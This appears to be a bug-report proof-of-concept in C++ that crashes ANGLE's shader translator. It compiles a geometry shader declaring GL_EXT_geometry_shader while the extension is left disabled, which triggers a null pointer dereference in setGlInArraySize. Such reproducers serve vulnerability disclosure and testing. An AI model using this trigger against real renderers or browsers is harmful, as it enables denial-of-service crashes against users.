// PoC: ANGLE shader translator null pointer dereference in TSymbolTable::setGlInArraySize
// Bug: SymbolTable.cpp:192 — find("gl_in") returns nullptr, then dereferenced
// Trigger: Compile a geometry shader with GL_EXT_geometry_shader extension declared,
//          but without enabling the extension in ShBuiltInResources.
// Impact: SEGV at address 0x18 (null + struct offset) — crash/DoS

#include "GLSLANG/ShaderLang.h"
#include <cstdio>

int main() {
    sh::Initialize();

    ShBuiltInResources res;
    sh::InitBuiltInResources(&res);
    // Intentionally do NOT set res.EXT_geometry_shader = 1
    // This means gl_in is never registered in the symbol table

    const char *shader =
        "#version 310 es\n"
        "#extension GL_EXT_geometry_shader : require\n"
        "layout(triangles) in;\n"
        "layout(triangle_strip, max_vertices = 3) out;\n"
        "in vec4 v_position[3];\n"  // array decl triggers setGlInArraySize
        "void main() {\n"
        "    gl_Position = v_position[0];\n"
        "    EmitVertex();\n"
        "}\n";

    // GL_GEOMETRY_SHADER_EXT = 0x8DD9
    ShHandle compiler = sh::ConstructCompiler(0x8DD9, SH_GLES3_1_SPEC, SH_ESSL_OUTPUT, &res);
    if (!compiler) {
        printf("Failed to construct compiler\n");
        return 1;
    }

    ShCompileOptions options = {};
    options.objectCode = true;

    const char *sources[] = {shader};
    printf("Compiling geometry shader (EXT_geometry_shader NOT in resources)...\n");
    printf("Expected: SEGV at SymbolTable.cpp:192 (null deref of gl_in lookup)\n");
    sh::Compile(compiler, sources, 1, options);

    sh::Destruct(compiler);
    sh::Finalize();
    return 0;
}
